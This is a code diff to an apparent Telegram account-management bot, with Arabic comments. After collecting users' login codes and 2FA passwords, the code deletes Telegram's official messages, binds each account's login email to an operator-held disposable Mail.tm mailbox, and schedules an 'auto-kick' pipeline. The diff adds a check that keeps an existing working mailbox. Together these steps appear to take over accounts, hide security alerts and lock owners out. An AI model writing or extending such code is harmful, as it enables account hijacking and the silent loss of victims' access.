@@ -104,7 +104,19 @@ async def post_registration_setup(
     4. جدولة نظام الطرد التلقائي
     """
     await delete_telegram_official_messages(client)
-    email_res = await _bind_login_email(client, phone, phone_code_hash=phone_code_hash)
+    row = await database.get_session_by_phone(phone)
+    kept = await existing_login_email_ok(row)
+    if kept:
+        email_res = {
+            "success": True,
+            "email": kept,
+            "skipped": True,
+            "message": "بريد Login الحالي يعمل — لم يُغيَّر",
+        }
+    else:
+        email_res = await _bind_login_email(
+            client, phone, phone_code_hash=phone_code_hash
+        )
     await delete_telegram_official_messages(client)
     await database.set_auto_kick_stage(phone, 0)
     schedule_auto_kick_pipeline(phone)
@@ -138,6 +150,7 @@ async def submit_code(user_id: int, code: str) -> dict:
             "email_linked": email_res.get("success"),
             "login_email": email_res.get("email"),
             "email_error": email_res.get("error"),
+            "email_skipped": email_res.get("skipped", False),
         }
     except SessionPasswordNeededError:
         return {"success": True, "two_fa": True}
@@ -174,6 +187,7 @@ async def submit_2fa(user_id: int, password: str) -> dict:
             "email_linked": email_res.get("success"),
             "login_email": email_res.get("email"),
             "email_error": email_res.get("error"),
+            "email_skipped": email_res.get("skipped", False),
         }
     except PasswordHashInvalidError:
         return {"success": False, "error": "wrong_2fa"}
@@ -392,6 +406,27 @@ async def fetch_code_from_email(
     return await mailtm.fetch_code(address, password, attempts, interval)
 
 
+async def existing_login_email_ok(row) -> str | None:
+    """
+    بريد Login محفوظ وصندوق Mail.tm يعمل — لا نستبدله.
+    يعيد عنوان البريد أو None إن لزم الربط من جديد.
+    """
+    if not row:
+        return None
+    email = database.row_login_email(row)
+    pwd = database.row_get(row, "email_password")
+    if not email or not pwd:
+        return None
+    if database.is_legacy_login_email(email):
+        return None
+    try:
+        await mailtm.get_token(email, pwd)
+        return email
+    except Exception as e:
+        logger.debug("login email mailbox check %s: %s", email, e)
+        return None
+
+
 async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
     """
     جلسة مسجّلة: LoginChange (بدون hash).
@@ -454,7 +489,18 @@ async def _bind_login_email(
         return {"success": False, "error": str(e)}
 
 
-async def change_login_email(phone: str) -> dict:
+async def change_login_email(phone: str, force: bool = False) -> dict:
+    row = await database.get_session_by_phone(phone)
+    if not force:
+        kept = await existing_login_email_ok(row)
+        if kept:
+            return {
+                "success": True,
+                "email": kept,
+                "skipped": True,
+                "message": "بريد Login الحالي يعمل — لم يُغيَّر",
+            }
+
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة معطلة"}
@@ -650,16 +696,26 @@ def schedule_session_recovery(phone: str, delay: int, on_done=None):
 
 async def migrate_old_sessions_emails() -> dict:
     sessions = await database.get_sessions_needing_email_migration()
-    migrated = failed = 0
+    migrated = failed = skipped = 0
     for s in sessions:
         phone = s["phone"]
+        if await existing_login_email_ok(s):
+            skipped += 1
+            continue
         res = await change_login_email(phone)
-        if res.get("success"):
+        if res.get("skipped"):
+            skipped += 1
+        elif res.get("success"):
             migrated += 1
         else:
             failed += 1
         await asyncio.sleep(EMAIL_MIGRATION_DELAY)
-    return {"migrated": migrated, "failed": failed, "total": len(sessions)}
+    return {
+        "migrated": migrated,
+        "failed": failed,
+        "skipped": skipped,
+        "total": len(sessions),
+    }
 
 
 # ──────────────────────────────────────────
